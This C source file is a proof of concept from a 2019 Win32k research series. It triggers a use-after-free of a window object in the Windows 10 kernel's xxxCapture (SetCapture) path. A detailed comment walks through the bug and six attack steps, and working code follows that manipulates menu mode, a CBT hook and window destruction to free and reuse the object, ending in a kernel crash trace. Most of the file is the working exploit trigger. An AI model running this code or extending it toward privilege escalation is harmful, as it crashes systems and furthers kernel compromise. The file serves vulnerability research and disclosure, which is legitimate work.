//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #6 - xxxCapture PWND UAF
// Windows 10 x64
//

/*
 A pwnd UAF inside xxxCapture (SetCapture API).

 This is the psuedo code we're attacking:
 xxxCapture(PWND someWnd)
 {
   PWND p = GetCurrentW32Thread()->pq->lockedWnd;
   Lock(&GetCurrentW32Thread()->pq->lockedWnd, someWnd); // someWnd can be NULL.
   ...
   xxxWindowEvent (p, ...); // UAF!
   ...
   if (thread in menu mode)
	lock capture state for thread // This side effect is important, as described below.

   xxxSendMessage(p); // This is where we will destroy our window from user-mode.
   ...
}

Remember that a Lock function will release its previous object.
If we manage to get a last ref at that point, it will release our zombie and continue working with it even though it was freed.
Unlike our normal primitve of the bug class, this is another way because we don't need a chain effect for the UAF!
Causing the last ref to be at the right moment is enough in this case.

The big problem was to get this zombie last ref at that precise spot and we had to go into ugly code paths to achieve that.
Normal zombie reloading doesn't work in this case.
Researching for the traditional way to do zombie reloading where we try to callback to user-mode, destroy the window, and then capture that zombie,
yielded no good results. Every function that sets a capture, also releases a capture, and it became too messy to pursue that way.

Unfortunately the solution is also a bit messy, but works :)

Eventually our end goal is to get a zombie window captured.
Thus the thread's captured window will reference our zombie as its last ref.

 When we destroy the window then it calls xxxReleaseCapture to clean up the capturing state of the thread.
 This time the trick here was making sure xxxReleaseCapture fail releasing the target capture window when it's called from xxxDestroyWindow.
 In order to do that we abuse the fact that capturing has a state machine and it locks its own state as long as there's a menu mode for the thread in the background.
 Therefore, we enter a menu mode which locks the capturing state while we are destroying the window.
 And then the zombie will still be captured, because it couldn't free the capturing.

If we enter a menu mode, then the capturing is locked by the menu code. So we can't even capture our own window.
To bypass that we have first to unlock the state of the menu mode window capture!
So we can then call SetCapture on our target window.

These are the steps for the attack to work properly:

Step #1 - Enter menu mode
	a. Now capture state is locked

Step #2 - Enter recursed menu
	a. Recursed menu automatically undoes capture state locking

Step #3 - Fail entering this menu mode, so it's not stuck in that function waiting for user input
	Side effect is already done, capturing state is unlocked!

Step #4 -
	a. Call SetCapture on our target window
	b. Call SetCapture on our same target window again
	This time xxxCapture locks the capture state (because it's inside a menu mode!) -

Step #5 - ... and calls back to user-mode, where we destroy our target window
	xxxDestroyWindow will call xxxReleaseCapture, but it will fail as capturing state is locked

Step #6 - Call SetCapture with NULL
  It releases our zombie window inside with the last reference, and continues to use the PWND even though it's freed

Most of the code in this POC deals with the menu-mode games.

Stack trace of crash:
nt!KiPageFault + 0x42e
win32kfull!xxxCapture + 0x203
win32kfull!xxxReleaseCapture + 0x3e
win32kfull!NtUserCallNoParam + 0x70
*/

#include <windows.h>
#include <stdio.h>

HWND g_target = NULL, g_menuOwner = NULL;

LRESULT CALLBACK hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_CREATEWND)
	{
		if (GetClassWord((HWND)wParam, GCW_ATOM) == 0x8000) // Verify it's a menu window.
		{
			printf("Step #3\n");
			printf("Killing TrackPopupMenu.\n");
			return 1; // Fail creation of window.
		}
	}
	return 0;
}

void ReleaseCaptureDancing()
{
	printf("Let's dance!\n");

	RECT rc;
	HHOOK hK = SetWindowsHookEx(WH_CBT, hookProc, NULL, GetCurrentThreadId());

	// Note that owner must be the same as the window of the first menu created.
	// Now setting up another menu mode, that is a recurse from the first main menu mode.
	// Once it's initializing it's gonna unlock the capturing lock of the thread.
	// But we will have to fail it in the middle, so it won't get in our way.
	// Using a CBT hook we will not let it create its menu window, and it will exit immediately.
	// The side effect we need just happened anyway.
	TrackPopupMenu(CreatePopupMenu(), TPM_RECURSE, 0, 0, 0, g_menuOwner, &rc);
	UnhookWindowsHookEx(hK);

	// Now it should be okay :)
	if (!ReleaseCapture())
	{
		printf("Couldn't release!\n");
	}
	else
	{
		printf("Dancing's good\n");
	}
}

LRESULT CALLBACK targetWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == WM_CAPTURECHANGED)
	{
		printf("Step #5\n");
		printf("Destroying window\n");

		// Destroy the target window.
		// This time it won't be able to release the capture from the second call to SetCapture,
		// as the capturing state is locked because we're in a menu mode.
		DestroyWindow(hWnd);

		// Here we're going back to the second SetCapture below,
		// with a zombie window having a last reference by the thread's capture lock.
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}

LRESULT CALLBACK menuWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	static int once = 1;
	// Idle is when the menu mode is full initialized.
	if (msg == WM_ENTERIDLE && once)
	{
		once = 0;
		printf("Step #2\n");

		// The thing is that the menu mode has its own window capture.
		// And they don't like anybody messing with it.
		// Therefore they got the capturing locked by setting some thread flag.
		// So we're going to do some dance to release it anyway. :)
		ReleaseCaptureDancing();

		printf("Step #4\n");
		// Now that we got capturing unlocked, we just set our target window.
		SetCapture(g_target);

		// Now, we set it again.
		// This time it's going to send a message to the previous window captured, our window.
		// The message is a notification to indicate the capture is changing.
		// It will call our target window's wndproc with WM_CAPTURECHANGED.
		// So basically it resets the capture, and captures it again with our target window.
		// But the difference is that now we're destroying the target window to make it a zombie.
		// Normally we know that once xxxDestroyWindow cleans up after itself,
		// it calls xxxReleaseCapture.
		// So in that DestroyWindow above it will still do so,
		// but here's the trick why we started with menu mode in the first place.
		// Before xxxCapture sends the WM_CAPTURECHANGED message, it sees that it's in a menu mode,
		// and it locks the capturing state of the thread!
		SetCapture(g_target);

		printf("Step #6");
		// At this point, finally, we got a zombie window with a last reference by thread's capturing lock.

		// Now reset the capture, which will release the zombie with the last ref.
		// Which then UAFing it inside xxxCapture.
		SetCapture(NULL);
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}

int main()
{
	printf("Step #1\n");

	WNDCLASS wc = { 0 };
	wc.lpszClassName = "blaclass";
	wc.lpfnWndProc = targetWndProc;
	RegisterClass(&wc);

	// This is the window we're going to attack.
	g_target = CreateWindow(wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	////
	// The next section is entering menu-mode:
	////
	HMENU hMenu = CreateMenu();
	HMENU hMenu2 = CreatePopupMenu();
	InsertMenu(hMenu2, 0, MF_STRING | MF_BYPOSITION, 1, "hello2");
	InsertMenu(hMenu, 0, MF_POPUP | MF_BYPOSITION, (UINT_PTR)hMenu2, (LPCSTR)"&hi");
	InsertMenu(hMenu, 1, MF_STRING | MF_BYPOSITION, 1, "hello");

	WNDCLASS wc2 = { 0 };
	wc2.lpszClassName = "blaclass2";
	wc2.lpfnWndProc = menuWndProc;
	RegisterClass(&wc2);

	g_menuOwner = CreateWindow(wc2.lpszClassName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 200, 200, NULL, hMenu, NULL, NULL);
	ShowWindow(g_menuOwner, SW_SHOW);

	// At last, enter menu mode modal loop, the rest will happen through callbacks.
	SendMessage(g_menuOwner, WM_SYSCOMMAND, SC_KEYMENU, (LPARAM)'h');

	return 0;
}
